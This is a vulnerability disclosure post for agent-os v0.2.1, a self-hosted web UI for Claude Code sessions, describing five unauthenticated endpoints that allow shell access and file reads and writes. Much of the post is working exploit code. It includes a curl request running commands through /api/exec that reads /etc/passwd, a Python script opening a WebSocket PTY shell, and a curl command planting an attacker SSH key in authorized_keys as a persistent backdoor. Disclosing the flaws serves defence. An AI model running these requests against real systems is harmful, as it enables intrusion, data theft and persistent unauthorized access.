---
title: "agent-os v0.2.1 — 5 Unauthenticated Critical Vulnerabilities Including CVSS 10.0 RCE"
date: 2026-05-27 10:00:00 +0000
categories: [CVE, RCE]
tags: [agent-os, rce, unauthenticated, websocket, file-read, file-write]
---

## Overview

**Affected software:** `@saadnvd1/agent-os` ≤ v0.2.1  
**CVSS 3.1 (worst):** 10.0 Critical  
**Reported:** 2026-05-27 (GitHub issue #47)

AgentOS is a self-hosted web UI for managing Claude Code sessions. The backend has **53 API routes plus a WebSocket terminal endpoint**, none of which enforce any authentication. The server binds to `0.0.0.0` by default.

## Findings

| # | Endpoint | Impact | CVSS |
|---|---|---|---|
| 01 | `WS /ws/terminal` | Full PTY shell | **10.0** |
| 02 | `POST /api/exec` | Arbitrary shell command | **10.0** |
| 03 | `POST /api/files/content` | Arbitrary file write | 9.6 |
| 04 | `GET /api/files/content` | Arbitrary file read | 7.5 |
| 05 | `GET /api/files` | Directory listing | 7.5 |

## FINDING-02 — Easiest Exploitation

One HTTP request is all that's needed:

```bash
curl -X POST http://victim:3011/api/exec \
  -H 'Content-Type: application/json' \
  -d '{"command": "id && cat /etc/passwd | head && uname -a"}'
```

Response:
```json
{"success": true, "output": "uid=1000(victim)...\nroot:x:0:0..."}
```

## FINDING-01 — WebSocket PTY Shell

```python
import asyncio, json, websockets

async def shell():
    async with websockets.connect("ws://victim:3011/ws/terminal") as ws:
        await ws.send(json.dumps({"type": "command", "data": "id && whoami"}))
        for _ in range(5):
            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=2))
            if msg.get("type") == "output":
                print("[RCE]", msg["data"])

asyncio.run(shell())
```

## FINDING-03 — Persistent Backdoor

```bash
# Plant SSH key
curl -X POST http://victim:3011/api/files/content \
  -H 'Content-Type: application/json' \
  -d '{"path":"~/.ssh/authorized_keys","content":"ssh-ed25519 AAAA... attacker"}'
```

## Root Cause

No `middleware.ts`, no token validation, no session check anywhere. The `.env.example` only contains `PORT` and `DB_PATH`.

## PoC Code

[github.com/BlessedOn3/poc-agent-os-unauth-rce](https://github.com/BlessedOn3/poc-agent-os-unauth-rce)

## Timeline

| Date | Event |
|------|-------|
| 2026-05-27 | Vulnerabilities discovered |
| 2026-05-27 | GitHub issue #47 opened |
